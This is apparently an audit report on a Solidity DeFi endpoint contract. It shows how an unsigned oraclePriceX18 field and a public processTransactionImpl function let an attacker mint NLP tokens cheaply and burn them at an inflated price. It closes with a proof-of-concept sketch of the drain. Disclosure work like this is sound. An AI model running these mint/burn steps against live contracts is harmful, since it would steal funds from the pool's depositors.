### Title
Attacker-Controlled `oraclePriceX18` in Unsigned `SignedMintNlp`/`SignedBurnNlp` Enables NLP Pool Drain via Direct `processTransactionImpl` Call — (`core/contracts/EndpointTx.sol`)

---

### Summary

`oraclePriceX18` is a field in `SignedMintNlp` and `SignedBurnNlp` that is **never included in the EIP-712 signed digest**. Because `processTransactionImpl` is a `public` function with no access-control modifier, any attacker can call it directly, supplying an arbitrary `oraclePriceX18` alongside a legitimately self-signed `{sender, quoteAmount/nlpAmount, nonce}` tuple. This allows minting NLP at an artificially low price and burning it at an artificially high price, draining quote from the NLP pool.

---

### Finding Description

**Root cause 1 — `oraclePriceX18` excluded from EIP-712 digest.**

`SignedMintNlp` and `SignedBurnNlp` are defined as:

```solidity
struct SignedMintNlp {
    MintNlp tx;          // sender, quoteAmount, nonce  ← signed
    bytes signature;
    int128 oraclePriceX18;        // ← NOT signed
    int128[] nlpPoolRebalanceX18; // ← NOT signed
}
``` [1](#0-0) 

The `computeDigest` for `MintNlp` hashes only `{MINT_NLP_SIGNATURE, sender, quoteAmount, nonce}`:

```solidity
digest = keccak256(abi.encode(
    keccak256(bytes(MINT_NLP_SIGNATURE)),
    signedTx.tx.sender,
    signedTx.tx.quoteAmount,
    signedTx.tx.nonce   // oraclePriceX18 absent
));
``` [2](#0-1) 

The same omission applies to `BurnNlp`. [3](#0-2) 

**Root cause 2 — `processTransactionImpl` is `public` with no access control.**

```solidity
function processTransactionImpl(bytes calldata transaction) public {
``` [4](#0-3) 

Any EOA can call this function directly, bypassing the sequencer's `submitTransactionsChecked` path (which does enforce `msg.sender == sequencer`). [5](#0-4) 

**Root cause 3 — price is set unconditionally from the attacker-supplied field.**

```solidity
priceX18[NLP_PRODUCT_ID] = signedTx.oraclePriceX18;   // line 547 (MintNlp)
priceX18[NLP_PRODUCT_ID] = signedTx.oraclePriceX18;   // line 567 (BurnNlp)
``` [6](#0-5) [7](#0-6) 

No bounds check, no comparison against any on-chain oracle, no staleness guard. The price is used directly to compute `nlpAmount = quoteAmount / oraclePriceX18` (mint) and `quoteAmount = nlpAmount * oraclePriceX18` (burn). [8](#0-7) [9](#0-8) 

**Mitigating factor — NLP lock period.**

Newly minted NLP is subject to `NLP_LOCK_PERIOD` before it can be burned (`getNlpUnlockedBalance` check). [10](#0-9) [11](#0-10) 

This prevents a same-block atomic attack but does **not** prevent the exploit — the attacker simply waits for the lock to expire, then calls `processTransactionImpl` with `oraclePriceX18=HIGH` on the burn. Since the price is never validated against any on-chain source at burn time either, the attacker can still supply any price they choose. [12](#0-11) 

---

### Impact Explanation

An attacker with a quote balance can:
- Mint NLP at `oraclePriceX18 = ε` (near-zero), receiving `quoteAmount / ε` NLP tokens.
- After the lock period, burn those tokens at `oraclePriceX18 = LARGE`, receiving `(quoteAmount / ε) * LARGE * (1 - 0.001)` quote.

Net profit ≈ `quoteAmount * (LARGE / ε) * 0.999 − quoteAmount`, which is unbounded. The quote is drawn from the NLP pool subaccounts via `_applyNlpRebalance`. This constitutes direct theft of quote from the NLP pool. [13](#0-12) 

---

### Likelihood Explanation

- No special privileges required — any EOA with a quote balance can execute this.
- `processTransactionImpl` is `public` and directly callable on-chain.
- The attacker signs their own transactions (they are the `sender`), so signature validation passes trivially.
- The only delay is the NLP lock period, which is a known, fixed duration.

---

### Recommendation

1. **Include `oraclePriceX18` in the EIP-712 digest** for both `MintNlp` and `BurnNlp` in `Verifier.computeDigest`, so the user's signature commits to the price they accept.
2. **Validate `oraclePriceX18` against an on-chain oracle** (e.g., require it to be within a tolerance band of a trusted price feed) before using it in `mintNlp`/`burnNlp`.
3. **Restrict `processTransactionImpl`** to be callable only by the sequencer or internally, consistent with the intent of `submitTransactionsChecked`.

---

### Proof of Concept

```solidity
// Attacker EOA: attacker
// Precondition: attacker has quoteBalance = Q

// Step 1: Sign MintNlp{sender=attacker, quoteAmount=Q, nonce=N}
// Signature S1 covers only {MINT_NLP_SIGNATURE, attacker, Q, N}

// Step 2: Construct SignedMintNlp with oraclePriceX18 = 1 (1e-18 in X18 format)
bytes memory mintTx = abi.encodePacked(
    uint8(TransactionType.MintNlp),
    abi.encode(SignedMintNlp({
        tx: MintNlp({sender: attacker, quoteAmount: Q, nonce: N}),
        signature: S1,
        oraclePriceX18: 1,           // near-zero price → huge nlpAmount
        nlpPoolRebalanceX18: [Q]     // valid: sums to quoteAmount
    }))
);
endpoint.processTransactionImpl(mintTx);
// nlpAmount = Q / 1 = Q (in X18 arithmetic, enormous)

// Step 3: Wait for NLP_LOCK_PERIOD

// Step 4: Sign BurnNlp{sender=attacker, nlpAmount=nlpMinted, nonce=N+1}
// Signature S2 covers only {BURN_NLP_SIGNATURE, attacker, nlpMinted, N+1}

// Step 5: Construct SignedBurnNlp with oraclePriceX18 = LARGE
bytes memory burnTx = abi.encodePacked(
    uint8(TransactionType.BurnNlp),
    abi.encode(SignedBurnNlp({
        tx: BurnNlp({sender: attacker, nlpAmount: nlpMinted, nonce: N+1}),
        signature: S2,
        oraclePriceX18: LARGE,       // high price → huge quoteAmount
        nlpPoolRebalanceX18: [-burnQuote]
    }))
);
endpoint.processTransactionImpl(burnTx);
// quoteAmount = nlpMinted * LARGE * 0.999 >> Q
// assert: attacker.quoteBalance >> Q  (profit extracted from NLP pool)
```
